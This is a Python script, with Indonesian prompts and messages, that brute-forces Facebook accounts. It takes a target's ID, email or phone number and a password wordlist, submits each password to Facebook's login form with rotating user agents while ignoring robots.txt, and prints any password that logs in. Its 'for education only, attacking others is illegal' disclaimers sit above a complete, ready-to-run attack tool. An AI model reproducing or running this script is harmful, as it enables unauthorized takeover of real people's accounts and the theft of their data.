#!usr/bin/python


import sys
import mechanize
import cookielib
import random

print "# Jangan menyerang akun facebook orang lain itu ilegal!"
print "# Script ini hanya untuk tujuan pendidikan."
print "# Pembuat script ini tidak bertanggung jawab atas apa yang telah anda perbuat."


email = str(raw_input("Masukan ID Facebook (/) Email (/) Nomer Telepone : "))

passwordlist = str(raw_input("masukan nama wordlist  : "))


login = 'https://www.facebook.com/login.php?login_attempt=1'


useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

def main():
	global br
	br = mechanize.Browser()
	cj = cookielib.LWPCookieJar()
	br.set_handle_robots(False)
	br.set_handle_redirect(True)
	br.set_cookiejar(cj)
	br.set_handle_equiv(True)
	br.set_handle_referer(True)
	br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
	welcome()
	search()
	print("Kata sandi tidak ada di daftar kata")

	
	
def brute(password):
	sys.stdout.write("\r[*] Sabar Loading ..... {}\n".format(password))
	sys.stdout.flush()
	br.addheaders = [('User-agent', random.choice(useragents))]
	site = br.open(login)
	br.select_form(nr = 0)
	br.form['email'] = email
	br.form['pass'] = password
	sub = br.submit()
	log = sub.geturl()
	if log != login and (not 'login_attempt' in log):
			print("\n\n[+] PASSWORD =>  {}".format(password))
			raw_input("Tekan enter untuk keluar....")
			sys.exit(1)

			
def search():
	global password
	passwords = open(passwordlist,"r")
	for password in passwords:
		password = password.replace("\n","")
		brute(password)

		
#welcome 
def welcome():
	wel = """
        +=========================================+
        |--------->   Facebook Crack   <----------|
        +-----------------------------------------+
        |            BACALAH DOA DULU             | 
        |	       Version 1.0                |
 	|  Keberhasilan tergantung wordlist anda  |
        +=========================================+
        |--------->  Facebook Cracker  <----------|
        +-----------------------------------------+\n\n
"""
	total = open(passwordlist,"r")
	total = total.readlines()
	print wel 
	print " [*] Account yang di retas : {}".format(email)
	print " [*] Total :" , len(total), "passwords"
	print " [*] Cracking, mohon tunggu ...\n\n"

	
if __name__ == '__main__':
	main()

